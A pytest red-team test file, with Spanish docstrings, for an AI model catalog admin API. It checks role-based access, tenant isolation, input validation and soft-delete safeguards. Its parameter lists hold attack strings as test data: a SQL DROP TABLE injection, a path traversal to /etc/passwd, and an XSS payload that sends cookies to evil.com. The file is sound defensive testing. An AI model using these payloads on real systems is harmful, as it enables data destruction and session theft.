"""
Vector Red Team 19 (`tests/security_redteam/test_19_ai_model_catalog_security_and_rbac.py`):
Auditoría ofensiva SAST/DAST, control de acceso y blindaje de integridad financiera
para la funcionalidad del Catálogo de Modelos LLM y Motores JEV (`public.ai_model_configs`):

1. Vector 1: RBAC de 3 Niveles y Aislamiento Cross-Tenant IDOR:
   - 'platform_admin.ai_models.read' permite acceso a staff global de OppyTec.
   - Bloqueo estricto con HTTP 403 Forbidden a usuarios o tokens del plano Tenant (prevención de Cross-Tenant IDOR).
   - 'platform_admin.ai_models.create', 'update', 'delete' exigen rango administrativo global y bloquean accesos con sólo lectura o no privilegiados.
2. Vector 2: Inyecciones en 'model_slug', Sanitización XSS y Rechazo de Payloads Maliciosos:
   - Inyección SQL, Path Traversal, caracteres no alfanuméricos en 'model_slug' son rechazados por regex estricto.
   - Payloads XSS/Polyglot en 'display_name', 'provider' y 'description' son bloqueados por 'sanitize_text_input'.
   - Campos no autorizados (Mass Assignment) son rechazados por 'extra="forbid"'.
   - Rechazo de números en coma flotante ('float') en todas las tarifas (Zero-Float Guarantee).
3. Vector 3: Protección contra Borrado Accidental, Sabotaje y Preservación FinOps:
   - Bloqueo determinista (HTTP 409 Conflict) de eliminación o desactivación del modelo predeterminado ('is_default=True').
   - Veto de borrado físico si el modelo posee llamadas históricas en 'llm_request_logs' o 'jev_request_logs'.
   - Conmutación forzosa a baja lógica (Soft-Delete) preservando trazabilidad de costos.
   - Borrado físico autorizado exclusivamente ante 0 referencias de telemetría.
"""
from __future__ import annotations

import uuid
from decimal import Decimal
from typing import Any

import httpx
import pytest
from pydantic import ValidationError

from src.core.exceptions import SecurityValidationError
from src.core.security import create_access_token
from src.modules.oppy_ai.application.ai_model_catalog_service import AiModelCatalogService
from src.modules.oppy_ai.domain.ai_model_catalog import AiEngineTier
from src.modules.oppy_ai.presentation.router import (
    _ai_model_catalog_service,
    _model_registry,
)
from src.modules.oppy_ai.presentation.schemas import (
    AiModelConfigCreateRequest,
    AiModelConfigUpdateRequest,
)

pytestmark = pytest.mark.security_redteam


def _make_global_staff_token(
    permissions: list[str],
    *,
    user_id: int = 1,
    hierarchy_rank: int = 10,
) -> dict[str, str]:
    """Genera cabeceras con JWT autenticado en el plano Global Platform Admin."""
    token = create_access_token(
        user_id=user_id,
        is_global_staff=True,
        hierarchy_rank=hierarchy_rank,
        role_grants=permissions,
    )
    return {"Authorization": f"Bearer {token}"}


def _make_tenant_user_token(
    permissions: list[str],
    *,
    user_id: int = 200,
    tenant_id: str | None = None,
) -> dict[str, str]:
    """Genera cabeceras con JWT de un usuario restringido al plano Tenant."""
    token = create_access_token(
        user_id=user_id,
        tenant_id=tenant_id or str(uuid.uuid4()),
        holding_id=str(uuid.uuid4()),
        tenant_schema="tenant_security_audit",
        is_global_staff=False,
        role_grants=permissions,
    )
    return {"Authorization": f"Bearer {token}"}


# ==============================================================================
# VECTOR 1: RBAC DE 3 NIVELES Y AISLAMIENTO CROSS-TENANT IDOR
# ==============================================================================


@pytest.mark.asyncio
async def test_rbac_global_staff_can_read_ai_models_catalog(async_client: httpx.AsyncClient) -> None:
    """Verifica que un miembro del staff global con 'platform_admin.ai_models.read' pueda listar modelos."""
    headers = _make_global_staff_token(["platform_admin.ai_models.read"])
    resp = await async_client.get("/api/v1/platform-admin/ai-models", headers=headers)
    assert resp.status_code == 200, resp.text
    data = resp.json()
    assert isinstance(data, list)
    assert len(data) >= 4
    slugs = [m["model_slug"] for m in data]
    assert "gemini-3.8-flash" in slugs
    assert "jev-fast-classifier" in slugs


@pytest.mark.asyncio
async def test_rbac_cross_tenant_idor_isolation_blocked(async_client: httpx.AsyncClient) -> None:
    """
    Verifica que usuarios pertenecientes a tenants NO puedan acceder al catálogo de modelos,
    incluso si sus tokens afirman poseer permisos de platform_admin.
    """
    tenant_headers = _make_tenant_user_token([
        "platform_admin.ai_models.read",
        "platform_admin.ai_models.create",
        "platform_admin.ai_models.update",
        "platform_admin.ai_models.delete",
    ])

    # Lectura bloqueada con 403 Forbidden
    resp_get = await async_client.get("/api/v1/platform-admin/ai-models", headers=tenant_headers)
    assert resp_get.status_code == 403

    # Lectura de modelo individual bloqueada con 403 Forbidden
    resp_detail = await async_client.get(
        "/api/v1/platform-admin/ai-models/gemini-3.8-flash",
        headers=tenant_headers,
    )
    assert resp_detail.status_code == 403

    # Creación bloqueada con 403 Forbidden
    resp_post = await async_client.post(
        "/api/v1/platform-admin/ai-models",
        json={
            "model_slug": "tenant-idor-model",
            "display_name": "Tenant Model",
            "provider": "Malicious",
            "engine_tier": "SYSTEM_2_LLM",
        },
        headers=tenant_headers,
    )
    assert resp_post.status_code == 403

    # Eliminación bloqueada con 403 Forbidden
    resp_del = await async_client.delete(
        "/api/v1/platform-admin/ai-models/claude-3-7-sonnet",
        headers=tenant_headers,
    )
    assert resp_del.status_code == 403


@pytest.mark.asyncio
async def test_rbac_privilege_escalation_blocked_for_read_only_staff(
    async_client: httpx.AsyncClient,
) -> None:
    """
    Verifica que personal con permiso exclusivo de lectura no pueda ejecutar mutaciones
    (POST, PUT, DELETE) en el catálogo de modelos globales.
    """
    read_only_headers = _make_global_staff_token(["platform_admin.ai_models.read"])

    # Intento de creación -> 403
    resp_post = await async_client.post(
        "/api/v1/platform-admin/ai-models",
        json={
            "model_slug": "escalation-model",
            "display_name": "Escalation Test",
            "provider": "Attacker",
            "engine_tier": "SYSTEM_2_LLM",
        },
        headers=read_only_headers,
    )
    assert resp_post.status_code == 403

    # Intento de actualización -> 403
    resp_put = await async_client.put(
        "/api/v1/platform-admin/ai-models/gemini-3.8-flash",
        json={"latency_p95_ms": 9999},
        headers=read_only_headers,
    )
    assert resp_put.status_code == 403

    # Intento de eliminación -> 403
    resp_del = await async_client.delete(
        "/api/v1/platform-admin/ai-models/claude-3-7-sonnet",
        headers=read_only_headers,
    )
    assert resp_del.status_code == 403


@pytest.mark.asyncio
async def test_unauthenticated_request_blocked_with_401(async_client: httpx.AsyncClient) -> None:
    """Verifica que solicitudes anónimas sin cabecera de autorización sean rechazadas con 401."""
    resp = await async_client.get("/api/v1/platform-admin/ai-models")
    assert resp.status_code == 401


# ==============================================================================
# VECTOR 2: INYECCIONES EN 'model_slug', XSS EN CAMPOS Y MASS ASSIGNMENT
# ==============================================================================


@pytest.mark.parametrize(
    "malicious_slug",
    [
        "'; DROP TABLE ai_model_configs; --",
        "slug' OR '1'='1",
        "../../etc/passwd",
        "<script>alert('XSS')</script>",
        "slug with spaces",
        "UPPERCASE_SLUG",
        "slug_with_null\x00byte",
        "invalid@character!",
        "",
        "a",  # min_length=2
    ],
)
def test_malicious_model_slug_injection_blocked_by_pydantic_regex(malicious_slug: str) -> None:
    """
    Verifica que ningún payload de inyección SQL, XSS, Path Traversal o formato inválido
    sea aceptado en 'model_slug'.
    """
    with pytest.raises(ValidationError):
        AiModelConfigCreateRequest(
            model_slug=malicious_slug,
            display_name="Valid Name",
            provider="Valid Provider",
        )


@pytest.mark.parametrize(
    "xss_payload",
    [
        "<script>alert('pwned')</script>",
        "<img src=x onerror=alert(document.cookie)>",
        "<svg onload=fetch('//evil.com/?c='+document.cookie)>",
        "javascript:alert(1)",
        "{{7*7}}",
        "malicious\x00byte",
    ],
)
def test_xss_polyglots_blocked_in_text_and_description_fields(xss_payload: str) -> None:
    """
    Verifica que vectores de ataque XSS y polyglots sean interceptados y bloqueados
    en 'display_name', 'provider' y 'description'.
    """
    # 1. XSS en display_name
    with pytest.raises(SecurityValidationError):
        AiModelConfigCreateRequest(
            model_slug="valid-slug",
            display_name=xss_payload,
            provider="Valid Provider",
            description="Safe description",
        )

    # 2. XSS en provider
    with pytest.raises(SecurityValidationError):
        AiModelConfigCreateRequest(
            model_slug="valid-slug",
            display_name="Valid Name",
            provider=xss_payload,
            description="Safe description",
        )

    # 3. XSS en description (Create)
    with pytest.raises(SecurityValidationError):
        AiModelConfigCreateRequest(
            model_slug="valid-slug",
            display_name="Valid Name",
            provider="Valid Provider",
            description=xss_payload,
        )

    # 4. XSS en description (Update)
    with pytest.raises(SecurityValidationError):
        AiModelConfigUpdateRequest(
            description=xss_payload,
        )


def test_mass_assignment_and_extra_fields_forbidden() -> None:
    """Verifica que el envío de campos no declarados sea estrictamente rechazado (extra='forbid')."""
    with pytest.raises(ValidationError) as exc_info:
        AiModelConfigCreateRequest(
            model_slug="safe-slug",
            display_name="Safe Model",
            provider="Safe Provider",
            role="superadmin",  # Intento de mass assignment
            is_god_mode=True,
        )
    assert "extra_forbidden" in str(exc_info.value)

    with pytest.raises(ValidationError) as exc_info_update:
        AiModelConfigUpdateRequest(
            display_name="Updated Safe Model",
            injected_admin=True,
        )
    assert "extra_forbidden" in str(exc_info_update.value)


def test_zero_float_enforcement_strictly_rejects_floats() -> None:
    """Garantiza que el uso de números float sea rechazado para evitar errores de precisión financiera."""
    with pytest.raises(ValidationError):
        AiModelConfigCreateRequest(
            model_slug="float-model",
            display_name="Float Model",
            provider="Test",
            input_cost_per_1m_usd=0.075,  # float prohibido
        )


# ==============================================================================
# VECTOR 3: PROTECCIÓN CONTRA BORRADO ACCIDENTAL, SABOTAJE Y SOFT-DELETE
# ==============================================================================


@pytest.mark.asyncio
async def test_default_model_deletion_and_disablement_vetoed(
    async_client: httpx.AsyncClient,
) -> None:
    """
    Verifica que sea imposible eliminar o desactivar el modelo predeterminado ('is_default=True'),
    garantizando la disponibilidad continua del servicio LLM/JEV.
    """
    admin_headers = _make_global_staff_token([
        "platform_admin.ai_models.update",
        "platform_admin.ai_models.delete",
    ])

    # 1. Veto de eliminación sobre default
    resp_del = await async_client.delete(
        "/api/v1/platform-admin/ai-models/gemini-3.8-flash",
        headers=admin_headers,
    )
    assert resp_del.status_code == 409
    err = resp_del.json()
    assert err["error_code"] == "CANNOT_DELETE_DEFAULT_MODEL"

    # 2. Veto de desactivación sobre default
    resp_put = await async_client.put(
        "/api/v1/platform-admin/ai-models/gemini-3.8-flash",
        json={"is_enabled": False},
        headers=admin_headers,
    )
    assert resp_put.status_code == 409
    assert resp_put.json()["error_code"] == "CANNOT_DISABLE_DEFAULT_MODEL"


@pytest.mark.asyncio
async def test_model_with_telemetry_logs_forces_soft_delete_and_vetoes_hard_delete(
    async_client: httpx.AsyncClient,
) -> None:
    """
    Verifica que si un modelo tiene registros en 'llm_request_logs' o 'jev_request_logs':
    1. Un intento forzado de 'hard_delete=true' es vetado con HTTP 409 Conflict.
    2. La eliminación normal conmuta automáticamente a Soft-Delete (is_enabled=False, is_deleted=True).
    3. Todos los registros históricos de auditoría y FinOps quedan preservados.
    """
    admin_headers = _make_global_staff_token([
        "platform_admin.ai_models.read",
        "platform_admin.ai_models.create",
        "platform_admin.ai_models.delete",
    ])

    model_slug = "redteam-audit-model"
    # Registrar modelo
    await async_client.post(
        "/api/v1/platform-admin/ai-models",
        json={
            "model_slug": model_slug,
            "display_name": "Red Team Audit Model",
            "provider": "AuditProvider",
            "engine_tier": "SYSTEM_2_LLM",
            "input_cost_per_1m_usd": "1.500000",
            "output_cost_per_1m_usd": "4.500000",
            "is_default": False,
        },
        headers=admin_headers,
    )

    # Simular 3,500 invocaciones históricas registradas en telemetría
    _ai_model_catalog_service.set_telemetry_count(model_slug, 3500)

    # 1. Intento forzado de Hard Delete -> Vetado con 409 Conflict
    resp_hard = await async_client.delete(
        f"/api/v1/platform-admin/ai-models/{model_slug}?hard_delete=true",
        headers=admin_headers,
    )
    assert resp_hard.status_code == 409
    assert resp_hard.json()["error_code"] == "CANNOT_HARD_DELETE_REFERENCED_MODEL"

    # 2. Eliminación estándar -> Conmuta a Soft Delete con HTTP 200 OK
    resp_soft = await async_client.delete(
        f"/api/v1/platform-admin/ai-models/{model_slug}",
        headers=admin_headers,
    )
    assert resp_soft.status_code == 200, resp_soft.text
    payload = resp_soft.json()
    assert payload["action"] == "SOFT_DELETED_ARCHIVED"
    assert payload["model_slug"] == model_slug
    assert payload["is_enabled"] is False
    assert payload["historical_telemetry_logs_preserved"] == 3500

    # 3. El modelo ya no debe figurar en listados estándar activos
    resp_list = await async_client.get("/api/v1/platform-admin/ai-models", headers=admin_headers)
    active_slugs = [m["model_slug"] for m in resp_list.json()]
    assert model_slug not in active_slugs
